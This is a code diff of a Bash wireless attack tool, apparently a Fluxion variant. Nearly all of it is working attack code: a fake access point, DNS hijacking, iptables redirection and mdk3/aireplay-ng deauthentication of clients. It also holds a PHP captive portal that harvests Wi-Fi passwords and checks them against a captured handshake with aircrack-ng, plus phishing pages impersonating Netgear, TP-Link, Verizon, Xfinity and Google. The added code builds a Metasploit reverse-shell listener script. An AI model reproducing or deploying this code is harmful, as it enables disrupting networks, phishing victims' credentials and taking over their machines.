-        			love
-        			break
-                        elif [ "$webconf" = "49" ]; then
+                        elif [ "$webconf" = "47" ]; then
                                 conditional_clear
                                 webinterface
                                 break
-      fi
+      			fi
 
         done
 fi
-        preattack
-        attack
 }
-
-# Create different settings required for the script
-function preattack {
-
-        # Config HostAPD
-        echo "interface=$WIFI
-driver=nl80211
-ssid=$Host_SSID
-
-channel=$Host_CHAN" > $DUMP_PATH/hostapd.conf
-
-
-        # Creates PHP
-        echo "<?php
-error_reporting(0);
-
-\$count_my_page = (\"$DUMP_PATH/hit.txt\");
-\$hits = file(\$count_my_page);
-\$hits[0] ++;
-\$fp = fopen(\$count_my_page , \"w\");
-fputs(\$fp , \$hits[0]);
-fclose(\$fp);
-
-// Receive form Post data and Saving it in variables
-\$key1 = @\$_POST['key1'];
-
-// Write the name of text file where data will be store
-\$filename = \"$DUMP_PATH/data.txt\";
-\$filename2 = \"$DUMP_PATH/status.txt\";
-\$intento = \"$DUMP_PATH/intento\";
-\$attemptlog = \"$DUMP_PATH/pwattempt.txt\";
-
-// Marge all the variables with text in a single variable.
-\$f_data= ''.\$key1.'';
-
-\$pwlog = fopen(\$attemptlog, \"w\");
-fwrite(\$pwlog, \$f_data);
-fwrite(\$pwlog,\"\n\");
-fclose(\$pwlog);
-
-\$file = fopen(\$filename, \"w\");
-fwrite(\$file, \$f_data);
-fwrite(\$file,\"\n\");
-fclose(\$file);
-
-\$archivo = fopen(\$intento, \"w\");
-fwrite(\$archivo,\"\n\");
-fclose(\$archivo);
-
-while( 1 ) {
-
-        if (file_get_contents( \$intento ) == 1) {
-                header(\"Location:error.html\");
-                unlink(\$intento);
-            break;
-        }
-
-        if (file_get_contents( \$intento ) == 2) {
-                header(\"Location:final.html\");
-                break;
-        }
-
-        sleep(1);
-}
-?>" > $DUMP_PATH/data/check.php
-
-        # Config DHCP
-        echo "authoritative;
-
-default-lease-time 600;
-max-lease-time 7200;
-
-subnet $RANG_IP.0 netmask 255.255.255.0 {
-
-option broadcast-address $RANG_IP.255;
-option routers $IP;
-option subnet-mask 255.255.255.0;
-option domain-name-servers $IP;
-
-range $RANG_IP.100 $RANG_IP.250;
-
-}" > $DUMP_PATH/dhcpd.conf
-
-        #create an empty leases file
-        touch $DUMP_PATH/dhcpd.leases
-
-        # creates Lighttpd web-server
-        echo "server.document-root = \"$DUMP_PATH/data/\"
-
-  server.modules = (
-    \"mod_access\",
-    \"mod_alias\",
-    \"mod_accesslog\",
-    \"mod_fastcgi\",
-    \"mod_redirect\",
-    \"mod_rewrite\"
-  )
-
-  fastcgi.server = ( \".php\" => ((
-                  \"bin-path\" => \"/usr/bin/php-cgi\",
-                  \"socket\" => \"/php.socket\"
-                )))
-
-  server.port = 80
-  server.pid-file = \"/var/run/lighttpd.pid\"
-  # server.username = \"www\"
-  # server.groupname = \"www\"
-
-  mimetype.assign = (
-  \".pdf\"  => \"application/pdf\",
-  \".zip\"  => \"application/zip\",
-  \".html\" => \"text/html\",
-  \".htm\" => \"text/html\",
-  \".txt\" => \"text/plain\",
-  \".jpg\" => \"image/jpeg\",
-  \".gif\" => \"image/gif\",
-  \".png\" => \"image/png\",
-  \".jpeg\" => \"image/jpeg\",
-  \".mp3\" => \"audio/mpeg\",
-  \".swf\" => \"application/x-shockwave-flash\",
-  \".css\" => \"text/css\"
-  )
-
-
-  server.error-handler-404 = \"/\"
-
-  static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
-  index-file.names = ( \"index.htm\", \"index.html\" )
-
-  \$SERVER[\"socket\"] == \":443\" {
-        url.redirect = ( \"^/(.*)\" => \"http://www.internet.com\")
-        ssl.engine                  = \"enable\"
-        ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
-
-  }
-
-  #Redirect www.domain.com to domain.com
-  \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
-        url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
-        ssl.engine                  = \"enable\"
-        ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
-  }
-  " >$DUMP_PATH/lighttpd.conf
-
-
-# that redirects all DNS requests to the gateway
-        echo "import socket
-
-class DNSQuery:
-  def __init__(self, data):
-    self.data=data
-    self.dominio=''
-
-    tipo = (ord(data[2]) >> 3) & 15
-    if tipo == 0:
-      ini=12
-      lon=ord(data[ini])
-      while lon != 0:
-        self.dominio+=data[ini+1:ini+lon+1]+'.'
-        ini+=lon+1
-        lon=ord(data[ini])
-
-  def respuesta(self, ip):
-    packet=''
-    if self.dominio:
-      packet+=self.data[:2] + \"\x81\x80\"
-      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
-      packet+=self.data[12:]
-      packet+='\xc0\x0c'
-      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
-      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
-    return packet
-
-if __name__ == '__main__':
-  ip='$IP'
-  print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip
-
-  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-  udps.bind(('',53))
-
-  try:
-    while 1:
-      data, addr = udps.recvfrom(1024)
-      p=DNSQuery(data)
-      udps.sendto(p.respuesta(ip), addr)
-      print 'Request: %s -> %s' % (p.dominio, ip)
-  except KeyboardInterrupt:
-    print 'Finalizando'
-    udps.close()" > $DUMP_PATH/fakedns
-        chmod +x $DUMP_PATH/fakedns
-}
-
-# Set up DHCP / WEB server
-# Set up DHCP / WEB server
-function routear {
-
-        ifconfig $interfaceroutear up
-        ifconfig $interfaceroutear $IP netmask 255.255.255.0
-
-        route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
-        sysctl -w net.ipv4.ip_forward=1 &>$flux_output_device
-
-  iptables --flush
-  iptables --table nat --flush
-  iptables --delete-chain
-  iptables --table nat --delete-chain
-  iptables -P FORWARD ACCEPT
-
-  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
-  iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:443
-  iptables -A INPUT -p tcp --sport 443 -j ACCEPT
-  iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
-  iptables -t nat -A POSTROUTING -j MASQUERADE
-
-}
-
-# Attack
-function attack {
-
-        interfaceroutear=$WIFI
-
-        handshakecheck
-        nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
-
-        if [ "$fakeapmode" = "hostapd" ]; then
-
-                ifconfig $WIFI down
-                sleep 0.4
-                macchanger --mac=${mac::13}$nomac${mac:14:4} $WIFI &> $flux_output_device
-                sleep 0.4
-                ifconfig $WIFI up
-                sleep 0.4
-        fi
-
-
-        if [ $fakeapmode = "hostapd" ]; then
-                killall hostapd &> $flux_output_device
-                xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
-                elif [ $fakeapmode = "airbase-ng" ]; then
-                killall airbase-ng &> $flux_output_device
-                xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
-        fi
-        sleep 5
-
-        routear &
-        sleep 3
-
-
-        killall dhcpd &> $flux_output_device
-        fuser -n tcp -k 53 67 80 &> $flux_output_device
-        fuser -n udp -k 53 67 80 &> $flux_output_device
-
-        xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
-        xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e "if type python2 >/dev/null 2>/dev/null; then python2 $DUMP_PATH/fakedns; else python $DUMP_PATH/fakedns; fi" &
-
-        lighttpd -f $DUMP_PATH/lighttpd.conf &> $flux_output_device
-
-        killall aireplay-ng &> $flux_output_device
-        killall mdk3 &> $flux_output_device
-        echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
-
-        xterm -hold $TOPRIGHT -title "Wifi Information" -e $DUMP_PATH/handcheck &
-        conditional_clear
-
-        while true; do
-                top
-
-                echo -e ""$red"["$yellow"2"$red"]"$transparent" Attack in progress .."
-                echo "                                       "
-                echo "      1) Choose another network"
-                echo "      2) Exit"
-                echo " "
-                echo -n '      #> '
-                read yn
-                case $yn in
-                        1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
-                        2 ) matartodo; exitmode; break;;
-                        * ) echo "
-$general_case_error"; conditional_clear ;;
-                esac
-        done
-
-}
-
-# Checks the validity of the password
-function handshakecheck {
-
-        echo "#!/bin/bash
-
-        echo > $DUMP_PATH/data.txt
-        echo -n \"0\"> $DUMP_PATH/hit.txt
-        echo "" >$DUMP_PATH/loggg
-
-        tput civis
-        clear
-
-        minutos=0
-        horas=0
-        i=0
-        timestamp=\$(date +%s)
-
-        while true; do
-
-        segundos=\$i
-        dias=\`expr \$segundos / 86400\`
-        segundos=\`expr \$segundos % 86400\`
-        horas=\`expr \$segundos / 3600\`
-        segundos=\`expr \$segundos % 3600\`
-        minutos=\`expr \$segundos / 60\`
-        segundos=\`expr \$segundos % 60\`
-
-        if [ \"\$segundos\" -le 9 ]; then
-        is=\"0\"
-        else
-        is=
-        fi
-
-        if [ \"\$minutos\" -le 9 ]; then
-        im=\"0\"
-        else
-        im=
-        fi
-
-        if [ \"\$horas\" -le 9 ]; then
-        ih=\"0\"
-        else
-        ih=
-        fi">>$DUMP_PATH/handcheck
-
-        if [ $authmode = "handshake" ]; then
-                echo "if [ -f $DUMP_PATH/pwattempt.txt ]; then
-                cat $DUMP_PATH/pwattempt.txt >> \"$PASSLOG_PATH/$Host_SSID-$Host_MAC.log\"
-                rm -f $DUMP_PATH/pwattempt.txt
-                fi
-
-                if [ -f $DUMP_PATH/intento ]; then
-
-                if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
-                echo \"2\">$DUMP_PATH/intento
-                break
-                else
-                echo \"1\">$DUMP_PATH/intento
-                fi
-
-                fi">>$DUMP_PATH/handcheck
-
-        elif [ $authmode = "wpa_supplicant" ]; then
-                  echo "
-                if [ -f $DUMP_PATH/pwattempt.txt ]; then
-                cat $DUMP_PATH/pwattempt.txt >> $PASSLOG_PATH/$Host_SSID-$Host_MAC.log
-                rm -f $DUMP_PATH/pwattempt.txt
-                fi
-
-                wpa_passphrase $Host_SSID \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
-                wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &
-
-                if [ -f $DUMP_PATH/intento ]; then
-
-                if grep -i 'WPA: Key negotiation completed' $DUMP_PATH/loggg; then
-                echo \"2\">$DUMP_PATH/intento
-                break
-                else
-                echo \"1\">$DUMP_PATH/intento
-                fi
-
-                fi
-                ">>$DUMP_PATH/handcheck
-        fi
-
-        echo "readarray -t CLIENTESDHCP < <(nmap -PR -sn -n -oG - $RANG_IP.100-110 2>&1 | grep Host )
-
-        echo
-        echo -e \"  ACCESS POINT:\"
-        echo -e \"    SSID............: "$white"$Host_SSID"$transparent"\"
-        echo -e \"    MAC.............: "$yellow"$Host_MAC"$transparent"\"
-        echo -e \"    Channel.........: "$white"$Host_CHAN"$transparent"\"
-        echo -e \"    Vendor..........: "$green"$Host_MAC_MODEL"$transparent"\"
-        echo -e \"    Operation time..: "$blue"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
-        echo -e \"    Attempts........: "$red"\$(cat $DUMP_PATH/hit.txt)"$transparent"\"
-        echo -e \"    Clients.........: "$blue"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)"$transparent"\"
-        echo
-        echo -e \"  CLIENTS ONLINE:\"
-
-        x=0
-        for cliente in \"\${CLIENTESDHCP[@]}\"; do
-          x=\$((\$x+1))
-          CLIENTE_IP=\$(echo \$cliente| cut -d \" \" -f2)
-          CLIENTE_MAC=\$(nmap -PR -sn -n \$CLIENTE_IP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])
-
-          if [ \"\$(echo \$CLIENTE_MAC| wc -m)\" != \"18\" ]; then
-                CLIENTE_MAC=\"xx:xx:xx:xx:xx:xx\"
-          fi
-
-          CLIENTE_FABRICANTE=\$(macchanger -l | grep \"\$(echo \"\$CLIENTE_MAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
-
-          if echo \$CLIENTE_MAC| grep -q x; then
-                    CLIENTE_FABRICANTE=\"unknown\"
-          fi
-
-          CLIENTE_HOSTNAME=\$(grep \$CLIENTE_IP $DUMP_PATH/clientes.txt | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print \$2}' | awk -F ')' '{print \$1}')
-
-          echo -e \"    $green \$x) $red\$CLIENTE_IP $yellow\$CLIENTE_MAC $transparent($blue\$CLIENTE_FABRICANTE$transparent) $green \$CLIENTE_HOSTNAME$transparent\"
-        done
-
-        echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck
-
-
-        if [ $authmode = "handshake" ]; then
-                echo "let i=\$(date +%s)-\$timestamp
-                sleep 1">>$DUMP_PATH/handcheck
-
-        elif [ $authmode = "wpa_supplicant" ]; then
-                echo "sleep 5
-
-                killall wpa_supplicant &>$flux_output_device
-                killall wpa_passphrase &>$flux_output_device
-                let i=\$i+5">>$DUMP_PATH/handcheck
-        fi
-
-        echo "done
-        clear
-        echo \"1\" > $DUMP_PATH/status.txt
-
-        sleep 7
-
-        killall mdk3 &>$flux_output_device
-        killall aireplay-ng &>$flux_output_device
-        killall airbase-ng &>$flux_output_device
-        kill \$(ps a | grep python| grep fakedns | awk '{print \$1}') &>$flux_output_device
-        killall hostapd &>$flux_output_device
-        killall lighttpd &>$flux_output_device
-        killall dhcpd &>$flux_output_device
-        killall wpa_supplicant &>$flux_output_device
-        killall wpa_passphrase &>$flux_output_device
-
-        echo \"
-        FLUX $version by ghost
-
-        SSID: $Host_SSID
-        BSSID: $Host_MAC ($Host_MAC_MODEL)
-        Channel: $Host_CHAN
-        Security: $Host_ENC
-        Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
-        Password: \$(cat $DUMP_PATH/data.txt)
-        \" >\"$HOME/Desktop/$Host_SSID-password.txt\"">>$DUMP_PATH/handcheck
-
-
-        if [ $authmode = "handshake" ]; then
-                echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"The password was saved in "$red"$HOME/Desktop/$Host_SSID-password.txt"$transparent"\"
-                ">>$DUMP_PATH/handcheck
-
-        elif [ $authmode = "wpa_supplicant" ]; then
-                echo "echo -e \"The password was saved in "$red"$HOME/Desktop/$Host_SSID-password.txt"$transparent"\"">>$DUMP_PATH/handcheck
-        fi
-
-        echo "kill -INT \$(ps a | grep bash| grep flux | awk '{print \$1}') &>$flux_output_device">>$DUMP_PATH/handcheck
-        chmod +x $DUMP_PATH/handcheck
-}
-
-
-############################################# < ATTACK > ############################################
-
-
-
-
-
-
-############################################## < STUFF > ############################################
-
-# Deauth all
-function deauthall {
-
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
-}
-
-function deauthmdk3 {
-
-        echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
-        mdk3PID=$!
-}
-
-# Deauth to a specific target
-function deauthesp {
-
-        sleep 2
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
-}
-
-# Close all processes
-function matartodo {
-
-        killall aireplay-ng &>$flux_output_device
-        kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
-        killall hostapd &>$flux_output_device
-        killall lighttpd &>$flux_output_device
-        killall dhcpd &>$flux_output_device
-        killall xterm &>$flux_output_device
-
-}
-
-######################################### < INTERFACE WEB > ########################################
-
-# Create the contents for the web interface
-function NEUTRA {
-
-        if [ ! -d $DUMP_PATH/data ]; then
-                mkdir $DUMP_PATH/data
-        fi
-
-        source $WORK_DIR/lib/site/index | base64 -d > $DUMP_PATH/file.zip
-
-        unzip $DUMP_PATH/file.zip -d $DUMP_PATH/data &>$flux_output_device
-        rm $DUMP_PATH/file.zip &>$flux_output_device
-
-        echo "<!DOCTYPE html>
-        <html>
-        <head>
-            <title>Login Page</title>
-            <meta charset=\"UTF-8\">
-            <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
-                <!-- Styles -->
-            <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
-                <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
-                <!-- Scripts -->
-                <script src=\"js/jquery-1.11.1.min.js\"></script>
-                <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
-        </head>
-        <body>
-                <!-- final page -->
-            <div id=\"done\" data-role=\"page\" data-theme=\"a\">
-                        <div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
-                                <h3 style=\"text-align:center;\">$DIALOG_WEB_OK</h3>
-                        </div>
-            </div>
-        </body>
-</html>" > $DUMP_PATH/data/final.html
-
-        echo "<!DOCTYPE html>
-        <html>
-        <head>
-            <title>Login Page</title>
-            <meta charset=\"UTF-8\">
-            <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
-                <!-- Styles -->
-            <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
-                <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
-                <!-- Scripts -->
-                <script src=\"js/jquery-1.11.1.min.js\"></script>
-                <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
-                <script src=\"js/jquery.validate.min.js\"></script>
-                <script src=\"js/additional-methods.min.js\"></script>
-        </head>
-        <body>
-                <!-- Error page -->
-            <div data-role=\"page\" data-theme=\"a\">
-                        <div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
-                                <h3 style=\"text-align:center;\">$DIALOG_WEB_ERROR</h3>
-                                <a href=\"index.htm\" class=\"ui-btn ui-corner-all ui-shadow\" onclick=\"location.href='index.htm'\">$DIALOG_WEB_BACK</a>
-                        </div>
-            </div>
-        </body>
-</html>" > $DUMP_PATH/data/error.html
-
-        echo "<!DOCTYPE html>
-        <html>
-        <head>
-            <title>Login Page</title>
-            <meta charset=\"UTF-8\">
-            <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
-                <!-- Styles -->
-            <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
-                <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
-                <!-- Scripts -->
-                <script src=\"js/jquery-1.11.1.min.js\"></script>
-                <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
-                <script src=\"js/jquery.validate.min.js\"></script>
-                <script src=\"js/additional-methods.min.js\"></script>
-        </head>
-        <body>
-                <!-- Main page -->
-            <div data-role=\"page\" data-theme=\"a\">
-                        <div class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
-                                <fieldset>
-                                        <form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"POST\">
-                                                </br>
-                                                <div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
-                                                        <div>ESSID: <u>$Host_SSID</u></div>
-                                                        <div>BSSID: <u>$Host_MAC</u></div>
-                                                        <div>Channel: <u>$Host_CHAN</u></div>
-                                                </div>
-                                                <div style=\"text-align:center;\">
-                                                        <br><label>$DIALOG_WEB_INFO</label></br>
-                                                </div>
-                                                <div class=\"ui-field-contain\" >
-                                                        <label for=\"key1\">$DIALOG_WEB_INPUT</label>
-                                                        <input id=\"key1\" data-clear-btn=\"true\" type=\"password\" value=\"\" name=\"key1\" maxlength=\"64\"/>
-                                                </div>
-
-                                                <input data-icon=\"check\" data-inline=\"true\" name=\"submitBtn\" type=\"submit\" value=\"$DIALOG_WEB_SUBMIT\"/>
-                                        </form>
-                                </fieldset>
-                        </div>
-            </div>
-                <script src=\"js/main.js\"></script>
-                <script>
-    $.extend( $.validator.messages, {
-        required: \"$DIALOG_WEB_ERROR_MSG\",
-        maxlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MAX\" ),
-        minlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MIN\" )});
-  </script>
-        </body>
-</html>" > $DUMP_PATH/data/index.htm
-}
-
-# Functions to populate the content for the custom phishing pages
-function ARRIS {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/ARRIS-ENG/* $DUMP_PATH/data
-
-		}
-
-function BELKIN {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/belkin_eng/* $DUMP_PATH/data
-
-		}
-
-function NETGEAR {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/netgear_eng/* $DUMP_PATH/data
-
-		}
-
-function ARRIS2 {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/arris_esp/* $DUMP_PATH/data
-
-		}
-function NETGEAR2 {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/netgear_esp/* $DUMP_PATH/data
-
-		}
-
-function TPLINK {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-    	cp -r  $WORK_DIR/sites/tplink/* $DUMP_PATH/data
-		}
-
-function TPLINKVN {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-    	cp -r  $WORK_DIR/sites/tplink_vn/* $DUMP_PATH/data
-		}
-
-
-function VODAFONE {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/vodafone_esp/* $DUMP_PATH/data
-		}
-
-function VERIZON {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/verizon/Verizon_files $DUMP_PATH/data
-        cp $WORK_DIR/sites/verizon/Verizon.html $DUMP_PATH/data
-		}
-
-function HUAWEI {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/huawei_eng/* $DUMP_PATH/data
-
-        }
-
-function ZIGGO_NL {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/ziggo_nl/* $DUMP_PATH/data
-        }
-
-function KPN_NL {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/kpn_nl/* $DUMP_PATH/data
-        }
-
-function ZIGGO2016_NL {
-    	mkdir $DUMP_PATH/data &>$flux_output_device
-    	cp -r  $WORK_DIR/sites/ziggo2_nl/* $DUMP_PATH/data
-		}
-
-function FRITZBOX_DE {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/fritzbox_de/* $DUMP_PATH/data
-        }
-
-function FRITZBOX_ENG {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/fritzbox_eng/* $DUMP_PATH/data
-        }
-
-function GENEXIS_DE {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/genenix_de/* $DUMP_PATH/data
-        }
-
-function Login-Netgear {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/Login-Netgear/* $DUMP_PATH/data
-        }
-
-function Login-Xfinity {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/Login-Xfinity/* $DUMP_PATH/data
-        }
-
-function Telekom {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/telekom/* $DUMP_PATH/data
-        }
-
-function google {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/google_de/* $DUMP_PATH/data
-        }
-
-function MOVISTAR_ES {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/movistar_esp/* $DUMP_PATH/data
-  	}
-
-function VNPT {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-    	cp -r  $WORK_DIR/sites/vnpt/* $DUMP_PATH/data
-	}
-
 function trolling {
 	clear
 	sleep 0.5
@@ -2602,40 +2647,111 @@ function trolling {
         mkdir $DUMP_PATH/data &>$flux_output_device
     	cp -r  $WORK_DIR/sites/trolling2/* $DUMP_PATH/data
 	}
-	echo -e "1) Anonymous1"
-	echo -e "2) Anonymous2"
-	while true; do	
-	read choose
-	case $choose in
-	1) trolling1; break;;
-	2) trolling2; break;;
-	* ) echo "Unknown option. Please choose again";
-	esac
-	done
-	
+        if [ "$FLUX_AUTO" = "1" ];then
+                webconf=1
+        else
+                while true; do
+                        conditional_clear
+                        top
+
+                        infoap
+                        n=1
+                        echo
+                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_ConnectionRESET"
+                        echo
+                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Troll web version 1";n=`expr $n + 1`
+                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Troll web version 2";n=`expr $n + 1`
+                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"\e[1;31m $general_back"$transparent""
+                        echo
+                        echo -n "#? "
+                        read webconf
+                        if [ "$webconf" = "1" ]; then
+                                trolling1
+                                break
+
+                        elif [ "$webconf" = "2" ]; then
+                                trolling2
+                                break
+
+                        elif [ "$webconf" = "3" ]; then
+                                conditional_clear
+                                webinterface
+                                break
+      			fi
+
+        done
+fi
 }
 function love {
 	clear
 	sleep 0.5
 	function love2 {
-		 mkdir $DUMP_PATH/data &>$flux_output_device
+     mkdir $DUMP_PATH/data &>$flux_output_device
     	cp -r  $WORK_DIR/sites/sendmylove1/* $DUMP_PATH/data
 	}
 	function love3 {
      mkdir $DUMP_PATH/data &>$flux_output_device
     	cp -r  $WORK_DIR/sites/sendmylove2/* $DUMP_PATH/data
 	}
-	
-	echo -e "1) "
-	echo -e "2) "
-	echo -e "3) Love Story"
-	while true; do	
-	read choose
-	case $choose in
-	2) love2; break;;
-	3) love3; break;;
-	* ) echo "Unknown option. Please choose again"; 
-	esac
+        if [ "$FLUX_AUTO" = "1" ];then
+                webconf=1
+        else	
+                while true; do
+                        conditional_clear
+                        top
+
+                        infoap
+                        n=1
+                        echo
+                        echo -e ""$red"["$yellow"2"$red"]"$transparent" $header_ConnectionRESET"
+                        echo
+                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Love's web version 1";n=`expr $n + 1`
+                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"  Love's web version 2";n=`expr $n + 1`
+                        echo -e "      "$red"["$yellow"$n"$red"]"$transparent"\e[1;31m $general_back"$transparent""
+                        echo
+                        echo -n "#? "
+                        read webconf
+                        if [ "$webconf" = "1" ]; then
+                                love2
+                                break
+
+                        elif [ "$webconf" = "2" ]; then
+                                love3
+                                break
+
+                        elif [ "$webconf" = "3" ]; then
+                                conditional_clear
+                                webinterface
+                                break
+      			fi
+
+        done
+fi
+}
+function metasploit {
+	Metasp_configure="on"
+        mkdir $DUMP_PATH/data &>$flux_output_device
+    	cp -r  $WORK_DIR/sites/metasploit/* $DUMP_PATH/data
+	rm -rf $script_listerning
+	touch $script_listerning
+	echo -ne " ${red}=>${white} Set up payload : ${transparent}"
+	read paylo
+	echo -ne " ${red}=>${white} Set up port : ${transparent}"
+	read port
+		echo "use exploit/multi/handler" > $script_listerning
+		echo "set payload $paylo" >> $script_listerning
+		echo "set lhost 192.168.1.1" >> $script_listerning
+		echo "set lport $port" >> $script_listerning
+		echo "set ExitOnSession false" >> $script_listerning
+	echo -ne " ${red}=>${white} run multi command (y/n): ${transparent}"
+	while true; do
+	   read yn
+	   case $yn in
+		y) 
+gedit $script_auto_command
+echo "set AutoRunScript multi_console_command -r $script_auto_command" >> $script_listerning; break;;
+		n) break;;
+	   esac
 	done
 }
 ######################################### < INTERFACE WEB > ########################################
